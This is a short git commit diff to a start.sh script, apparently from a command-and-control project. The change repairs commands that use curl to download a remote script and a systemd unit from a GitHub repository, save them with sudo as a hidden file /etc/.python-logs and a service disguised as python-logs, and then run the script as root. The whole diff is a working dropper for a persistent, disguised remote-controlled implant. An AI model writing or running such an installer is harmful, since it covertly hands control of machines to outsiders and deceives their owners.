cb5dc10c992b22841589b11148b1dfbaf10c32ba
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 11:17:28 -0500

    Refactor curl commands to use tee for file output

--- start.sh
+++ start.sh
@@ -1,6 +1,10 @@
 #!/bin/bash
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh | sudo /etc/.python-logs
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service | sudo /etc/systemd/system/python-logs.service
+
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh \
+  | sudo tee /etc/.python-logs > /dev/null
+
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
+  | sudo tee /etc/systemd/system/python-logs.service > /dev/null
 
 sudo chmod +x /etc/.python-logs
 sudo bash /etc/.python-logs
